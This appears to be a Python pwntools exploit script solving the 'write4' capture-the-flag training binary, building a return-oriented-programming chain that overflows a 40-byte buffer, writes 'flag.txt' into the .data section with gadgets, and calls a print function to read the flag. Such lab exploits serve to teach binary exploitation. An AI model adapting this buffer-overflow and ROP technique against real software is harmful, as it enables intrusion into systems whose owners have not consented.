#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template write4
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('write4')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

junk = b'A'*40                  # Junk
r14r15Gadget = p64(0x400690)    # Gadget to setup write gadget, pop .data address
                                #   and pop string
dataAddress = p64(0x601028)     # Address of .data section
writeGadget = p64(0x400628)     # Address of write gadget
string = b'flag.txt'            # String to write
rdiGadget = p64(0x400693)       # pop pointer to string into rdi
printFunction = p64(0x400510)   # Address of function plt

payload = junk + r14r15Gadget + dataAddress + string + writeGadget + rdiGadget + dataAddress + printFunction

log.info(io.clean())
io.sendline(payload)
log.info(io.clean())

io.interactive()

